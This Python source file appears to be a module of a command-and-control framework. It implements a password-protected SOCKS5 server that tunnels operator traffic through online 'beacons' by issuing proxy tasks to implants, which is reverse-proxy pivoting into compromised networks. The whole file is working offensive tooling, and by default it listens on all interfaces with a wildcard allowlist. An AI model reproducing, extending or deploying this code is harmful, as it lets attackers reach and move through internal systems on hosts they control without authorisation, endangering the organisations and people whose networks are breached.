from __future__ import annotations

import asyncio
import base64
import ipaddress
import json
import secrets
import socket
import struct
import threading
from pathlib import Path

from .file_store import new_id, now_iso

PROXY_USER = "pyexec"


class ProxyManager:
    def __init__(self, runtime):
        self.runtime = runtime
        self.store = runtime.store
        self.server = None
        self._active: dict[str, dict] = {}
        self._lock = threading.RLock()
        self.port = 1080
        self.username = PROXY_USER
        self.password = ""
        self.allowlist = ["*"]
        self._load_config()

    def _config_path(self) -> Path:
        return self.runtime.settings.config_dir / "proxy.json"

    def _load_config(self) -> None:
        path = self._config_path()
        cfg = {}
        if path.exists():
            try:
                cfg = json.loads(path.read_text(encoding="utf-8"))
            except Exception:
                cfg = {}
        self.port = int(cfg.get("port", 1080))
        self.username = cfg.get("username", PROXY_USER)
        self.password = cfg.get("password") or secrets.token_urlsafe(18)
        self.allowlist = cfg.get("allowlist", ["*"])
        path.write_text(json.dumps({"port": self.port, "username": self.username, "password": self.password, "allowlist": self.allowlist}, indent=2), encoding="utf-8")

    def info(self) -> dict:
        return {
            "enabled": bool(self.server),
            "port": self.port,
            "username": self.username,
            "password": self.password,
            "allowlist": self.allowlist,
            "active_sessions": len(self._active),
            "mode": "reverse socks5 via implant tasks",
        }

    def _allowed(self, peer: str) -> bool:
        if "*" in self.allowlist:
            return True
        try:
            addr = ipaddress.ip_address(peer)
        except ValueError:
            return False
        for item in self.allowlist:
            try:
                if addr in ipaddress.ip_network(item, strict=False):
                    return True
            except ValueError:
                continue
        return False

    async def start(self) -> None:
        if self.server:
            return
        self.server = await asyncio.start_server(self._handle_client, "0.0.0.0", self.port)
        self.store.event("proxy.started", {"port": self.port, "username": self.username})

    async def stop(self) -> None:
        if self.server:
            self.server.close()
            await self.server.wait_closed()
            self.server = None
            self.store.event("proxy.stopped", {"port": self.port})

    async def _handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        peer = writer.get_extra_info("peername") or ("", 0)
        if not self._allowed(str(peer[0])):
            writer.close()
            return
        session_id = new_id("px_")
        beacon_hint = ""
        try:
            # SOCKS5 greeting
            ver, nmethods = await reader.readexactly(2)
            if ver != 5:
                return
            methods = await reader.readexactly(nmethods)
            if 2 not in methods:
                writer.write(b"\x05\xff")
                await writer.drain()
                return
            writer.write(b"\x05\x02")
            await writer.drain()
            # username/password auth
            aver, ulen = await reader.readexactly(2)
            if aver != 1:
                return
            username = (await reader.readexactly(ulen)).decode("utf-8", "replace")
            plen = (await reader.readexactly(1))[0]
            password = (await reader.readexactly(plen)).decode("utf-8", "replace")
            if password != self.password:
                writer.write(b"\x01\x01")
                await writer.drain()
                return
            writer.write(b"\x01\x00")
            await writer.drain()
            beacon_hint = username if username not in {"", self.username} else ""
            # CONNECT request
            req = await reader.readexactly(4)
            if req[0] != 5 or req[1] != 1:
                return
            atyp = req[3]
            if atyp == 1:
                host = socket.inet_ntoa(await reader.readexactly(4))
            elif atyp == 3:
                length = (await reader.readexactly(1))[0]
                host = (await reader.readexactly(length)).decode("utf-8", "replace")
            elif atyp == 4:
                host = socket.inet_ntop(socket.AF_INET6, await reader.readexactly(16))
            else:
                return
            port = struct.unpack(">H", await reader.readexactly(2))[0]
            open_result = await asyncio.to_thread(self._open_session, session_id, beacon_hint, host, port)
            if not open_result.get("ok"):
                writer.write(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
                await writer.drain()
                return
            beacon_id = open_result["beacon_id"]
            with self._lock:
                self._active[session_id] = {"beacon_id": beacon_id, "target": f"{host}:{port}", "since": now_iso()}
            self.store.event("proxy.session_opened", {"session_id": session_id, "beacon_id": beacon_id, "target": f"{host}:{port}"})
            writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
            await self._relay(session_id, beacon_id, reader, writer)
        except (asyncio.IncompleteReadError, ConnectionError, OSError):
            pass
        finally:
            with self._lock:
                self._active.pop(session_id, None)
            try:
                await asyncio.to_thread(self._close_session, beacon_id, session_id)
            except Exception:
                pass
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    def _pick_beacon(self, hint: str) -> str | None:
        beacons = [b for b in self.runtime.list_beacons() if b.get("status") == "online"]
        if hint:
            for beacon in beacons:
                if beacon.get("id") == hint or beacon.get("hostname") == hint:
                    return beacon["id"]
        return beacons[0]["id"] if beacons else None

    def _run_plugin_wait(self, beacon_id: str, plugin: str, args: dict, timeout: float = 30.0) -> dict:
        task = self.runtime.tasks.create_task(beacon_id, plugin=plugin, args=args, risk="R3", display=plugin)
        result = self.runtime.tasks.wait_for_task(task["id"], timeout=timeout)
        if not result:
            return {"ok": False, "error": "task timeout"}
        if result.get("error"):
            return {"ok": False, "error": result["error"]}
        return {"ok": True, "data": (result.get("result") or {}).get("data") or {}}

    def _open_session(self, session_id: str, hint: str, host: str, port: int) -> dict:
        beacon_id = self._pick_beacon(hint)
        if not beacon_id:
            return {"ok": False, "error": "no online beacon"}
        result = self._run_plugin_wait(beacon_id, "proxy", {"op": "open", "session_id": session_id, "host": host, "port": port}, timeout=120.0)
        if not result["ok"]:
            return result
        return {"ok": True, "beacon_id": beacon_id, "data": result["data"]}

    def _read_session(self, beacon_id: str, session_id: str) -> dict:
        return self._run_plugin_wait(beacon_id, "proxy", {"op": "read", "session_id": session_id, "size": 65536}, timeout=60.0)

    def _write_session(self, beacon_id: str, session_id: str, data: bytes) -> dict:
        return self._run_plugin_wait(beacon_id, "proxy", {"op": "write", "session_id": session_id, "data_b64": base64.b64encode(data).decode()}, timeout=60.0)

    def _close_session(self, beacon_id: str, session_id: str) -> dict:
        if not beacon_id:
            return {"ok": True}
        return self._run_plugin_wait(beacon_id, "proxy", {"op": "close", "session_id": session_id}, timeout=10.0)

    async def _relay(self, session_id: str, beacon_id: str, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        async def client_to_remote():
            try:
                while True:
                    data = await reader.read(65536)
                    if not data:
                        return
                    await asyncio.to_thread(self._write_session, beacon_id, session_id, data)
            except Exception:
                return

        upload = asyncio.create_task(client_to_remote())
        try:
            while True:
                result = await asyncio.to_thread(self._read_session, beacon_id, session_id)
                if not result.get("ok"):
                    break
                data = result.get("data") or {}
                if data.get("eof"):
                    break
                if data.get("timeout"):
                    if upload.done():
                        break
                    continue
                chunk = base64.b64decode(data.get("data_b64", ""))
                if chunk:
                    writer.write(chunk)
                    await writer.drain()
                if upload.done():
                    break
        finally:
            upload.cancel()
            try:
                await upload
            except Exception:
                pass
